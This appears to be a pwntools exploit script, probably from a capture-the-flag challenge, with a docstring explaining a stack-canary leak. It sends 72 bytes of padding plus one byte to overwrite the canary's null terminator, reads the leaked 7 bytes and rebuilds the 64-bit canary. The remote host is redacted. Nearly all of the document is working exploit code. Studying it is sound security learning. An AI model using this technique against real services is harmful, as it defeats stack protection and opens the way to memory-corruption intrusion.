"""
===========================================================================
🎯 Objective: Exfiltrate the 64-bit Stack Canary
💣 Vulnerability: Buffer Overflow (Null-byte overwrite)
⚔️ Method:
  1. Sends a padded payload designed to perfectly reach and overwrite the canary's null terminator (\x00).
  2. Because C-strings are null-terminated, overwriting the byte forces the server's output function to bleed the adjacent memory.
  3. Captures the leaked 7 bytes and mathematically reconstructs the original 64-bit canary value.
===========================================================================
"""

from pwn import *
r=remote(xxxxx)

payload_leak=b"A"*72+b"B"

r.sendlineafter(b"Ask me anything...", payload_leak)

r.recvuntil(b"B")
canary_leak=r.recv(7)

canary=b"\x00"+canary_leak

print(f"[+] Canarino catturato: {hex(u64(canary))}")

